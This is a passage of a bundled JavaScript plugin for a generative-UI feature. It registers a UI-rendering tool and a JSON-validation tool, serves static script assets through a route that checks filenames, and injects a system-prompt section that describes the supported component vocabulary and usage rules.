		console.error(`[genui-tool] spec wrapped as ${shape} but its JSON is broken (${raw.length} bytes, error at ${pos}); cannot recover — bytes lost in transit`);
		return;
	}
}
/** Total node count of a repaired spec — the shared guard traversal
* (`countGenuiNodes`) so the tool reports the SAME number the panel fold and
* validation use. A local walker used to under-count specs whose content
* lives inside tabs/accordion/file-tree (their children are not `.items`). */
function countNodes(spec) {
	return countGenuiNodes(spec, GENUI_LIMITS.maxNodes);
}
/** Tool-call title shared by the pending and completed presentations. */
function cardTitle(args) {
	const spec = repairGenuiSpec(specOf(args));
	return spec === null ? void 0 : `渲染 UI：${spec.title ?? "未命名"}`;
}
/**
* Build the render_ui tool definition. Registered by the plugin node half;
* `ctx.tools.register` consumes it exactly like a `defineTool` result.
*/
function createRenderUiTool() {
	return {
		name: "render_ui",
		description: "Render an interactive UI card in the conversation tool row by passing a GenUI spec (a white-listed component tree; the same vocabulary as the ```dsh-ui fence, see the system prompt). Use it when the user asks for a structured panel, dashboard, or form that belongs in the tool row rather than inline in the reply. The card is interactive client-side (tabs, buttons, inputs, switches); components carrying an \"action\" field send [genui-action] back to you when the user interacts, and you should re-render the updated UI.",
		parameters: RENDER_UI_PARAMETERS,
		output: {
			schema: RENDER_UI_OUTPUT_SCHEMA,
			render(_args, value) {
				return [{
					type: "text",
					text: String(value)
				}];
			},
			presentationMeta(args) {
				return repairGenuiSpec(specOf(args));
			}
		},
		async execute(args) {
			const spec = repairGenuiSpec(specOf(args));
			if (spec === null) return "render_ui：spec 无效 —— 根对象需要 \"items\" 数组（组件树白名单见系统提示词），请修正后重试。";
			return `已渲染 UI「${spec.title ?? "未命名"}」（${countNodes(spec)} 个组件）。用户现在可以看到这张卡片；组件带 action 时，用户交互会以 [genui-action] 消息发回给你，届时请重新渲染更新后的界面。`;
		},
		presentCall(args) {
			const title = cardTitle(args);
			return title === void 0 ? void 0 : {
				card: "generic",
				title,
				kind: "other"
			};
		},
		presentResult(args) {
			const title = cardTitle(args);
			return title === void 0 ? void 0 : {
				card: "generic",
				title
			};
		}
	};
}
/**
* The `validate_dsh_ui` tool: a model-facing pre-flight check for the
* ```dsh-ui fence channel. The model calls it with the JSON text it is about
* to put inside a fence; it reports whether the body parses as a valid GenUI
* spec, and when it does not, WHERE it breaks and WHAT is likely wrong
* (bracket counts, common typo classes) so the model can fix and re-validate
* before emitting — turning "render a red banner after the fact" into
* "verify before you send". Purely local: no LLM, no network, no DOM.
*/
const VALIDATE_DESCRIPTION = "Validate the JSON body of a ```dsh-ui fence BEFORE emitting it — use for non-trivial specs (≥3 nodes or containing a table); skip for trivial ones (≤2 nodes). Pass the exact JSON text you are about to put inside the fence as the \"spec\" argument (a string). Returns ✅ when it parses as a valid GenUI spec, or ❌ with the exact position, bracket counts, and likely causes when it does not — fix the JSON, re-validate, and only then emit the fence. When the JSON is broken but repairable (unescaped quotes, trailing commas, missing closers), the ❌ reply INCLUDES the auto-repaired JSON — copy it verbatim into the fence instead of rewriting by hand.";
const VALIDATE_PARAMETERS = {
	type: "object",
	properties: { spec: {
		oneOf: [{
			type: "string",
			description: "The exact JSON text of the fence body."
		}, {
			type: "object",
			description: "The spec object (serialized before validation)."
		}],
		description: "The dsh-ui fence body to validate: pass the JSON as a string for an exact check, or as the spec object."
	} },
	required: ["spec"],
	additionalProperties: false
};
/** Read the fence-body text from the call args (string preferred, object serialized). */
function fenceTextOf(args) {
	if (typeof args === "string") return args;
	if (typeof args !== "object" || args === null) return null;
	const record = args;
	const s = "spec" in record ? record.spec : "arguments" in record ? record.arguments : void 0;
	if (typeof s === "string") return s;
	if (typeof s === "object" && s !== null) return JSON.stringify(s);
	return null;
}
/** Count structural brackets outside string literals. */
function bracketCounts(raw) {
	const counts = {
		"{": 0,
		"}": 0,
		"[": 0,
		"]": 0
	};
	let inString = false;
	let escaped = false;
	for (let i = 0; i < raw.length; i++) {
		const ch = raw[i];
		if (escaped) {
			escaped = false;
			continue;
		}
		if (inString) {
			if (ch === "\\") escaped = true;
			else if (ch === "\"") inString = false;
			continue;
		}
		if (ch === "\"") {
			inString = true;
			continue;
		}
		if (ch === "{") counts["{"] += 1;
		else if (ch === "}") counts["}"] += 1;
		else if (ch === "[") counts["["] += 1;
		else if (ch === "]") counts["]"] += 1;
	}
	return counts;
}
/** Short structural hint from bracket counts (empty when balanced). */
function bracketDiagnostic(raw) {
	const c = bracketCounts(raw);
	const diffs = [];
	if (c["{"] !== c["}"]) {
		const d = c["{"] - c["}"];
		diffs.push(`{ ×${c["{"]} / } ×${c["}"]} → ${d > 0 ? `缺 ${d} 个 }` : `多 ${-d} 个 }`}`);
	}
	if (c["["] !== c["]"]) {
		const d = c["["] - c["]"];
		diffs.push(`[ ×${c["["]} / ] ×${c["]"]} → ${d > 0 ? `缺 ${d} 个 ]` : `多 ${-d} 个 ]`}`);
	}
	return diffs.length === 0 ? "" : `  括号计数：${diffs.join("；")}（长表格最易在收尾处错位，如把 ]]}]} 写成 ]}]}]}）\n`;
}
const COMMON_CAUSES = "常见原因：① 收尾括号错位/缺失（{ 与 }、[ 与 ] 数量不相等）② 字符串值内用了半角引号 \"（中文引语请用 “” 或 「」）③ 尾随逗号 ④ 字符串未闭合";
/** Build the validate_dsh_ui tool definition (registered alongside render_ui). */
function createValidateDshUiTool() {
	return {
		name: "validate_dsh_ui",
		description: VALIDATE_DESCRIPTION,
		parameters: VALIDATE_PARAMETERS,
		output: {
			schema: {
				type: "string",
				description: "Validation verdict for the model."
			},
			render(_args, value) {
				return [{
					type: "text",
					text: String(value)
				}];
			}
		},
		async execute(args) {
			const raw = fenceTextOf(args);
			if (raw === null || raw.trim() === "") return "❌ validate_dsh_ui：缺少 spec 参数 —— 把围栏 JSON 文本作为 spec 传入。";
			let parsed;
			try {
				parsed = JSON.parse(raw);
			} catch (error) {
				const detail = error instanceof Error ? error.message : String(error);
				const repaired = completeFenceJson(raw);
				if (repaired !== null && repairGenuiSpec(JSON.parse(repaired.text)) !== null) return `❌ dsh-ui 围栏 JSON 解析失败：${detail}。\n${bracketDiagnostic(raw)}  已自动修复 ${repaired.repairs} 处，下面是修复后的 JSON，直接作为围栏正文发出即可（无需再验证）：\n\`\`\`\n${repaired.text}\n\`\`\``;
				return `❌ dsh-ui 围栏 JSON 解析失败：${detail}。\n${bracketDiagnostic(raw)}  自动修复未能恢复（结构损坏），请按错误信息修正后重新调用本工具验证，通过后再发出围栏。\n${COMMON_CAUSES}`;
			}
			const spec = repairGenuiSpec(parsed);
			if (spec === null) return "❌ 不是合法 GenUI spec：根对象需要 \"items\" 数组，且每个节点 type 必须在白名单内（见系统提示词）。请修正后重新验证。";
			return `✅ dsh-ui spec 合法（${countNodes(spec)} 个组件），可以发出围栏。`;
		},
		presentCall() {
			return {
				card: "generic",
				title: "验证 dsh-ui 围栏",
				kind: "other"
			};
		},
		presentResult() {
			return {
				card: "generic",
				title: "验证 dsh-ui 围栏"
			};
		}
	};
}
//#endregion
//#region src/plugin/index.ts
/** Convention: tool guidance uses 100–199; bash's section is 104. */
const GENUI_SECTION_ORDER = 105;
/**
* The mermaid/three engines ship as standalone IIFE bundles under
* `lib/assets/` and are fetched by the client ONLY when a spec needs them.
* This route serves them from the plugin's own package directory through the
* host webserver service — the longest-prefix rule lets it win over the
* generic `/plugins` bundle route, and no host source change is needed. The
* service is optional at this plugin's start time (same ordering reality as
* the tools registry), so registration probes immediately AND on the
* `internal/service` event, exactly like the tools registration below.
*/
/** Route prefix under /plugins; anything under it is this plugin's asset. */
const ASSET_ROUTE_PATH = "/plugins/@omdsh-dev/dsh-genui/assets";
/** Safe flat file names only: no slashes, no traversal, js assets only. */
const ASSET_FILE_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*\.js$/;
/** The handler itself (registered via the optional webServer probe). */
async function serveGenuiAsset(req, res) {
	if (req.method !== "GET" && req.method !== "HEAD") {
		res.writeHead(405);
		res.end();
		return;
	}
	let pathname;
	try {
		pathname = decodeURIComponent(new URL(req.url ?? "/", "http://x").pathname);
	} catch {
		res.writeHead(400);
		res.end();
		return;
	}
	const rel = pathname.startsWith(`${ASSET_ROUTE_PATH}/`) ? pathname.slice(36) : null;
	if (rel === null) {
		res.writeHead(404);
		res.end();
		return;
	}
	const file = rel.slice(1);
	if (!ASSET_FILE_RE.test(file)) {
		res.writeHead(404);
		res.end();
		return;
	}
	try {
		const dir = fileURLToPath(new URL("./assets/", import.meta.url));
		const body = await readFile(join(dir, file));
		res.writeHead(200, {
			"content-type": "text/javascript; charset=utf-8",
			"cache-control": "no-cache"
		});
		res.end(body);
	} catch {
		res.writeHead(404);
		res.end();
	}
}
/** The fence language description injected into every assembled system prompt. */
const GENUI_SECTION_TEXT = `You can render interactive UI components INSIDE your reply — between paragraphs — by emitting a fenced block with the language tag \`dsh-ui\` containing a JSON spec:

\`\`\`dsh-ui
{"title":"可选标题","gap":14,"items":[...]}
\`\`\`

The spec is a white-listed component tree rendered inline where the fence sits. Vocabulary (only these \`type\` values; the \`genui\` skill, when available, carries the fuller content→component mapping and field details):

- text: {"type":"text","size":"h1|h2|h3|body|muted|caption","content":"...","center":true?}
- row / col: {"type":"row"|"col","items":[...],"wrap":true?,"spacer":true?,"gap":n?} — 布局容器
- grid: {"type":"grid","cols":n,"items":[...]} / card: {"type":"card","title":"...","items":[...]}
- button: {"type":"button","label":"...","tone":"primary|danger|success|ghost","full":true?,"small":true?,"icon":"emoji?","action":"name"?} — 无 action 时渲染为禁用态
- input / textarea: {"type":"input"|"textarea","label":"...","placeholder":"...","inputType":"text|email"?,"rows":n?,"value":"...","action":"name"?,"id":"field-id"?} — input 按 Enter 提交（submit:true）、textarea Ctrl/Cmd+Enter；blur 仅值有变化才发送；带 id 的值跨刷新持久化并被 sibling submit 收集为 fields:{id:value}
- select: {"type":"select","label":"...","options":[...],"selected":下标?,"action":"name"?,"id":"field-id"?} — id/selected 语义同 input
- checkbox / switch / slider: {"type":"checkbox"|"switch","label":"...","checked":true?,"action":"name"?} · {"type":"slider","label":"...","min":0,"max":100,"step":1,"value":n?,"action":"name"?,"id":"field-id"?} — slider 是数值表单：id 持久化并进 submit 的 fields
- radio: {"type":"radio","label":"...","options":[...],"selected":n?,"action":"name"?} — 加 "group":"题目名" 记录选择（点击不往返）；再加 "answer":正确下标|标签 与 "explanation":"解析" 供 sibling submit 本地判分
- submit: {"type":"submit","label":"交卷","groups":["q1"]?,"action":"name"?,"resetAction":"name"?} — LOCAL-FIRST：题目带 answer 时点击就地判分（得分 + 逐题 ✓/✗ + 解析）并锁定至「重新作答」，零往返、无需 action；仅当无 answer 时才发一个 action {answers:{group:choice},fields:{id:value},total,answered}；未答完保持禁用
- quiz: {"type":"quiz","question":"...","options":[{"label":"...","correct":true?,"feedback":"..."?}],"explanation":"...","id":"..."?,"action":"name"?} — 点选就地判对错 + 重试；id 变化重置；带 action 时另回传 {type:'quiz',question,answer,correct}
- link: {"type":"link","label":"...","href":"https://..."?} — 仅 http(s)/mailto；无 href 渲染为纯文本
- badge: {"type":"badge","label":"...","tone":"success|warn|danger|accent","icon":"emoji?"}
- stat: {"type":"stat","label":"...","value":"...","delta":"+12.4%|-3%"}
- progress: {"type":"progress","label":"...","value":0-100,"valueLabel":"70%"}
- divider: {"type":"divider"} / spacer: {"type":"spacer"}
- list: {"type":"list","items":["..."] or [{"title":"...","desc":"..."}]}
- table: {"type":"table","columns":["..."],"rows":[["...","..."]]} — 表头点击本地排序（升/降/还原，数值感知）
- chart: {"type":"chart","kind":"bars|line|donut","data":[{"label":"...","value":n,"color":"#hex?"}],"series":[...]?} — bars 默认；line 趋势；donut 占比；series=分组柱；负值柱高为 0 但标注照显；hover 显示精确值
- tabs: {"type":"tabs","tabs":[{"label":"...","items":[...]}]} / accordion: {"type":"accordion","items":[{"title":"...","items":[...]}]}
- avatar: {"type":"avatar","name":"..."}
- plot: {"type":"plot","series":[{"expr":"sin(x)","label":"...","kind":"line|area|scatter"?,"params":[...]?}],"xMin":-5,"xMax":5,"yMin":?,"yMax":?,"title":"..."} — SVG 函数图（可拖拽平移/滚轮缩放；params 渲染实时滑块）；kind 缺省 line，area 填到基线，scatter 散点；表达式白名单 sin/cos/tan/asin/acos/atan/sqrt/cbrt/exp/log/ln/abs/floor/ceil/round/min/max/pow，常量 pi/e/tau，变量 x
- callout: {"type":"callout","tone":"info|success|warning|error","title":"...","content":"..."}
- steps: {"type":"steps","current":n,"steps":[{"title":"...","desc":"..."}]}
- keyvalue: {"type":"keyvalue","pairs":[{"key":"...","value":"..."}]} / json: {"type":"json","value":...} / code: {"type":"code","lang":"ts","code":"..."} / diff: {"type":"diff","diffs":[{"path":"...","oldText":"..."|null,"newText":"..."}]}
- copy: {"type":"copy","label":"复制","text":"..."}
- mermaid: {"type":"mermaid","code":"graph TD\\nA-->B"} — flowchart/sequence/class/gantt/pie/er/state/journey
- scene3d: {"type":"scene3d","title":"...","meshes":[{"shape":"box|sphere|cone|cylinder|torus","color":"#hex?","size":n|[w,h,d]?,"position":[x,y,z]?,"rotation":[rx,ry,rz]?,"scale":n?|[x,y,z]?}],"ambient":0-2?,"background":"#hex?"} — 拖拽旋转滚轮缩放
- timeline: {"type":"timeline","items":[{"title":"...","desc":"...","time":"..."}]}
- file-tree: {"type":"file-tree","items":[{"name":"...","type":"file|dir","children":[...]?}]} — 目录行可点击折叠
- breadcrumb: {"type":"breadcrumb","items":["首页","设置","账户"]}

Rules:
- Trigger: 结构化表达优于纯文本时就主动用围栏（要点、强调、对比、流程、步骤、状态、数据、演示），纯问答与一句话不套 UI。
- 围栏放在回答中该组件该在的位置，文字前后照常流动；不要把围栏套进别的代码围栏，JSON 字符串内不放 markdown。
- Component choice (每个主题一个主组件): 结论/提醒→callout · 2–4 指标→grid+stat · 进度→progress · 多阶段→steps · 要点→list · 配置→keyvalue · 对比→table · 趋势→chart(line) · 占比→chart(donut) · 分类对比→chart(bars) · 数学曲线→plot · 事件→timeline · 分页内容→tabs · 长内容→accordion · 树→file-tree · 代码→code · 文件变更→diff · 嵌套JSON→json · 架构/流程→mermaid · 仅几何内容→scene3d · 教学→quiz · 单操作→button(action)。优先 table/chart 而非文字堆砌；同一数据不重复出现在两个组件；每次回复 3–8 个组件，拿不准就少。
- 语法: 坏围栏降级为代码块，保持 JSON 严格。≥3 节点或含 table 的围栏发出前调用 validate_dsh_ui 验证，❌ 则修好再发；若 ❌ 回复里附了「已自动修复」的 JSON，照抄即可。
- 主题: 内容适配暗色；UI 主题跟随 app，不要自造。规模: ≤200 节点、嵌套≤8 层（超出被截断）；3D 网格 1–5 个；plot 给合理 xMin/xMax。
- v2 actions: button/input/select/checkbox/radio/switch/slider/textarea/quiz 可带 "action":"name"，交互以 [genui-action] name + 组件数据回传，届时重渲染更新 UI。可交互组件必须带 action（无 action 按钮禁用）；带 action 的按钮点击有「已触发」本地反馈。
- LOCAL-FIRST: UI 自己能做的状态变化（判卷、判题、重置、展开、选中）全部就地完成，零模型往返；action 只用于必须模型参与的事（生成新内容、执行工具、下一步建议）。
- Durable state: 交互状态按「会话+内容指纹」持久化——刷新/重放同一内容恢复原状；换内容（换题、改 spec）自动清空。重渲染相同内容保留状态，渲染新内容重置状态。
- Exam pattern: 每题一个 radio（group 题目名 + answer + explanation）+ 一个 submit（groups 全列）；用户答完点交卷，本地即时判分。仅当用户要新卷或追问建议时才重渲染。
- Secrets ban: GenUI 不得索取密码、API Key、访问令牌、恢复码等秘密；需要时拒绝并解释。
- Tool channel: render_ui 工具把同一 spec 渲染为工具行卡片（交付物型界面用）；围栏用于回答内联 UI。
- Panel: "panel":true 围栏只渲染进会话面板 dock 并原地更新；"append":true 追加合并（同标签 tabs 追加/新标签加入/尾部追加）；面板上限 200 节点/200 次追加，满了发 replace 重建。面板组件来的 [genui-action] 只回一个 panel:true 围栏 + 至多一行 10 字以内确认，不解释、不用普通围栏。`;
/**
* Register the GenUI output-language section and the render_ui tool.
* @param ctx - cordis context.
*/
const inject = ["systemPrompt"];
function apply(ctx) {
	ctx.systemPrompt.section({
		name: "genui:fence",
		order: 105,
		text: GENUI_SECTION_TEXT
	});
	let registered = false;
	const tryRegister = (value) => {
		if (registered) return;
		const tools = value ?? ctx.reflect.get("tools", false);
		if (tools === void 0) return;
		tools.register(createRenderUiTool());
		tools.register(createValidateDshUiTool());
		registered = true;
	};
	tryRegister(void 0);
	ctx.on("internal/service", (name, value) => {
		if (name === "tools") tryRegister(value);
	});
	let assetsRegistered = false;
	const tryRegisterAssets = (value) => {
		if (assetsRegistered) return;
		const webServer = value ?? ctx.reflect.get("webServer", false);
		if (webServer === void 0) return;
		webServer.register({
			kind: "prefix",
			path: ASSET_ROUTE_PATH,
			handler: serveGenuiAsset
		});
		assetsRegistered = true;
	};
	tryRegisterAssets(void 0);
	ctx.on("internal/service", (name, value) => {
		if (name === "webServer") tryRegisterAssets(value);
	});
}
//#endregion
export { GENUI_SECTION_ORDER, GENUI_SECTION_TEXT, apply, inject };
